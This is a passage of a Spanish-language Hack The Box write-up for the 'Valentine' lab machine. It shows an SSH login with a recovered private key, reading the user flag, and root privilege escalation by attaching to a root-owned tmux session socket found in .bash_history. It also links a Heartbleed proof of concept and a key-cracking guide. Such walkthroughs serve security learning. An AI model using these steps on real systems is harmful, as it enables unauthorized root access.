+</span></span><span style="display:flex;"><span>    HostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa
+</span></span></code></pre></div><p>Guarda y cierra.</p>
+<hr>
+<p>Ahora trata de entrar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh hype@10.10.10.79 -i id_rsa                                      
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 12.04 LTS <span style="color:#f92672">(</span>GNU/Linux 3.2.0-23-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>New release <span style="color:#e6db74">&#39;14.04.5 LTS&#39;</span> available.
+</span></span><span style="display:flex;"><span>Run <span style="color:#e6db74">&#39;do-release-upgrade&#39;</span> to upgrade to it.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Fri Feb <span style="color:#ae81ff">16</span> 14:50:29 <span style="color:#ae81ff">2018</span> from 10.10.14.3
+</span></span><span style="display:flex;"><span>hype@Valentine:~$ ls
+</span></span><span style="display:flex;"><span>Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+</span></span><span style="display:flex;"><span>hype@Valentine:~$ cd Desktop/
+</span></span><span style="display:flex;"><span>hype@Valentine:~/Desktop$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>hype@Valentine:~/Desktop$ cat user.txt
+</span></span></code></pre></div><p>Listo, tenemos la flag del usuario. Busquemos como escalar privilegios.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Enum">Enumerando Máquina y Escalando Privilegios con Tmux</h3>
+<p>Tratemos de ver nuestros privilegios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hype@Valentine:~/Desktop$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>hype<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>hype<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>hype<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,124<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>hype@Valentine:~/Desktop$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> hype: 
+</span></span><span style="display:flex;"><span>Sorry, try again.
+</span></span></code></pre></div><p>Mmmmm esto va a estar complicado, veamos si no hay un archivo oculto por ahí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hype@Valentine:~/Desktop$ cd ..
+</span></span><span style="display:flex;"><span>hype@Valentine:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">192</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">21</span> hype hype  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">21</span> 15:04 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> ..
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">131</span> Feb <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">220</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> hype hype  <span style="color:#ae81ff">3486</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">11</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .cache
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">9</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .config
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .dbus
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2022</span> Desktop
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> hype hype    <span style="color:#ae81ff">26</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .dmrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Documents
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Downloads
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .fontconfig
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .gconf
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">4</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .gnome2
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">132</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .gtk-bookmarks
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .gvfs
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">636</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .ICEauthority
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .local
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .mission-control
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Music
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Pictures
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">675</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .profile
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Public
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .pulse
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype   <span style="color:#ae81ff">256</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .pulse-cookie
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .ssh
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Templates
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> hype hype    <span style="color:#ae81ff">26</span> Apr <span style="color:#ae81ff">21</span> 15:04 tmux-client-5340.log
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">39</span> Dec <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .tmux.conf
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> hype hype <span style="color:#ae81ff">37799</span> Apr <span style="color:#ae81ff">21</span> 15:04 tmux-server-5342.log
+</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> hype hype    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">21</span> 11:07 user.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> hype hype  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> Videos
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype     <span style="color:#ae81ff">0</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .Xauthority
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype <span style="color:#ae81ff">12173</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .xsession-errors
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> hype hype  <span style="color:#ae81ff">9659</span> Dec <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2017</span> .xsession-errors.old
+</span></span></code></pre></div><p>Hay muchas cosas, pero una me llama la atención, es el <strong>.bash_history</strong>, ya que normalmente, solo el Root lo puede ver.</p>
+<p>Vamos a verlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hype@Valentine:~$ cat .bash_history 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>exot
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>cd /
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>cd .devs
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>tmux -L dev_sess 
+</span></span><span style="display:flex;"><span>tmux a -t dev_sess 
+</span></span><span style="display:flex;"><span>tmux --help
+</span></span><span style="display:flex;"><span>tmux -S /.devs/dev_sess 
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p>No sé qué es eso de <strong>tmux</strong>, vamos a investigarlo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Tmux</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>tmux es un multiplexor de terminal para sistemas tipo unix, similar a GNU Screen o Byobu que permite dividir una consola en múltiples secciones o generar sesiones independientes en la misma terminal.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Me recuerda a la herramienta <strong>Terminator</strong> que divide las terminales, supongo que es similar.</p>
+<p>Ahora, busquemos si se pueden escalar privilegios.</p>
+<p>Encontré dos cosas:</p>
+<ul>
+<li>Un Exploit que sirve para las <strong>versiones 1.3 y 1.4</strong>, veamos que versión de <strong>tmux</strong> usa esta máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hype@Valentine:~$ tmux -V
+</span></span><span style="display:flex;"><span>tmux 1.6
+</span></span></code></pre></div><p>Mmmmm quizá no sirva.</p>
+<ul>
+<li>Este blog: <a href="https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0" target="_blank">Day 69: Hijacking Tmux Sessions 2 Priv. Esc.</a></li>
+</ul>
+<p>El blog explica como escalar privilegios usando un comando de <strong>tmux</strong>, que es el mismo que aparece en el historial.</p>
+<p>Vamos a usarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hype@Valentine:~$ tmux -S /.devs/dev_sess
+</span></span><span style="display:flex;"><span>root@Valentine:/home/hype# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root@Valentine:/home/hype# cd /root
+</span></span><span style="display:flex;"><span>root@Valentine:~# ls  
+</span></span><span style="display:flex;"><span>curl.sh  root.txt
+</span></span><span style="display:flex;"><span>root@Valentine:~# cat root.txt
+</span></span></code></pre></div><p>Wow, nos metió como a otra consola y somos <strong>Root</strong>. Bueno, ahí está la flag y con esto terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.enmimaquinafunciona.com/pregunta/182823/sed-para-eliminar-los-espacios-en-blanco" target="_blank" rel="noopener noreferrer">https://www.enmimaquinafunciona.com/pregunta/182823/sed-para-eliminar-los-espacios-en-blanco</a></li><li><a href="https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/" target="_blank" rel="noopener noreferrer">https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/</a></li><li><a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py" target="_blank" rel="noopener noreferrer">https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py</a></li><li><a href="https://github.com/mpgn/heartbleed-PoC" target="_blank" rel="noopener noreferrer">https://github.com/mpgn/heartbleed-PoC</a></li><li><a href="https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/" target="_blank" rel="noopener noreferrer">https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/</a></li><li><a href="https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported</a></li><li><a href="https://stackoverflow.com/questions/26705755/tmux-how-do-i-find-out-the-currently-running-version-of-tmux" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/26705755/tmux-how-do-i-find-out-the-currently-running-version-of-tmux</a></li><li><a href="https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0" target="_blank" rel="noopener noreferrer">https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-nibbles/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Nibbles - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-bounty/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Bounty - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
